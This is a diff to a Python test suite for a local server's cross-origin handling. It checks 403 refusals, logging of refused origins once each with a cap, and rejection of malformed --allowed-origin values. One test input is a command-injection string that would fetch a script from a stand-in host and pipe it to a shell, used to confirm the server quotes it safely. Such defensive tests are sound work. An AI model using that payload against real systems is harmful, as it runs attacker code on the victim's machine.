@@ -229,21 +229,28 @@ class ServerAccessTests(unittest.TestCase):
                         headers["Content-Type"].startswith("text/event-stream")
                     )
         # A page of any other origin is refused before the request is read, a
-        # preflight too, and learns nothing. The refusal names the flag.
-        for method, extra in (
-            ("POST", key),
-            ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
-        ):
-            with self.subTest(method=method):
-                status, headers, data = exchange(
-                    method, {"Origin": "https://other.example", **extra}, body
-                )
-                self.assertEqual(status, 403)
-                self.assertIsNone(headers["Access-Control-Allow-Origin"])
-                self.assertIn(
-                    "--allowed-origin https://other.example ",
-                    json.loads(data)["error"]["message"],
-                )
+        # preflight too, and learns nothing. The refusal names the flag, and
+        # the server prints it once, as the browser hides it from the page.
+        with mock.patch.object(server, "print_status") as printed:
+            for method, extra in (
+                ("POST", key),
+                ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
+            ):
+                with self.subTest(method=method):
+                    status, headers, data = exchange(
+                        method, {"Origin": "https://other.example", **extra}, body
+                    )
+                    self.assertEqual(status, 403)
+                    self.assertIsNone(headers["Access-Control-Allow-Origin"])
+                    self.assertIn(
+                        "--allowed-origin https://other.example ",
+                        json.loads(data)["error"]["message"],
+                    )
+        printed.assert_called_once_with(
+            "Refused · Origin https://other.example · restart with "
+            "--allowed-origin https://other.example to accept it",
+            error=True,
+        )
         # A client that is no page, and the server's own pages, get no such
         # header.
         host = "%s:%s" % harness.server.server_address
@@ -267,6 +274,30 @@ class ServerAccessTests(unittest.TestCase):
                 self.assertEqual(response.status, 200)
                 self.assertEqual(response.headers["Access-Control-Allow-Origin"], "*")
                 self.assertIsNone(response.headers["Vary"])
+
+    def test_refused_origins_are_logged_once_each_and_bounded(self):
+        log = server.RefusedOriginLog()
+        origins = [f"https://{index}.example" for index in range(log.LIMIT + 5)]
+        # An origin is printed cut to 256 characters, and a flag value a shell
+        # would run quoted.
+        origins[0] = "https://" + "a" * 300 + ".example"
+        origins[1] = "http://jan.app$(curl${IFS}evil.sh|sh)"
+        flags = [origins[0][:256], f"'{origins[1]}'", *origins[2:]]
+        with mock.patch.object(server, "print_status") as printed:
+            for origin in origins + origins:
+                log.report(origin)
+        self.assertEqual(
+            printed.call_args_list,
+            [
+                mock.call(
+                    f"Refused · Origin {origin[:256]} · restart with "
+                    f"--allowed-origin {flag} to accept it",
+                    error=True,
+                )
+                for origin, flag in zip(origins[: log.LIMIT], flags)
+            ]
+            + [mock.call("Refused · further Origins are not logged", error=True)],
+        )
 
     def test_authentication_precedes_body_parsing_and_admission(self):
         harness = self.harness(api_key="test-server-key")
@@ -371,12 +402,19 @@ class ServerAccessTests(unittest.TestCase):
         ):
             self.assertEqual(parse([*arguments, *flags]).allowed_origin, parsed)
             self.assertEqual(parse(arguments).allowed_origin, [])
-            with (
-                mock.patch("sys.stderr", io.StringIO()) as stderr,
-                self.assertRaises(SystemExit),
+            for origin, refusal in (
+                ("http://localhost/app", "expected a scheme and a host"),
+                ("tauri://*", "only a bare '*' admits every origin"),
             ):
-                parse([*arguments, "--allowed-origin", "http://localhost/app"])
-            self.assertIn("expected a scheme and a host", stderr.getvalue())
+                with (
+                    self.subTest(origin=origin),
+                    mock.patch("sys.stderr", io.StringIO()) as stderr,
+                    self.assertRaises(SystemExit),
+                ):
+                    parse([*arguments, "--allowed-origin", origin])
+                self.assertIn(
+                    f"{origin} is not an origin: {refusal}", stderr.getvalue()
+                )
 
     def test_cli_key_precedence_and_validation(self):
         for parse, arguments in PARSERS:
